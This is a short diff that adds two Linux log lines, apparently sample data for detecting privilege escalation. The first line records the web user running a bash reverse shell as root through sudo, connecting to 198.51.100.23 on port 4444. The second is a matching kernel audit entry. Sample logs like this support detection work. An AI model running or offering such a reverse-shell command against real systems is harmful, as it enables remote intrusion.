@@ -1,0 +1,2 @@
+Jan 15 14:22:10 web-prod sudo[28910]: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"
+Jan 15 14:22:10 web-prod kernel: [ 4521.102] audit: type=1300 audit(1705328530.123:412): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=28910 pid=28911 auid=1000 uid=33 gid=33 euid=0 comm="bash" exe="/bin/bash"
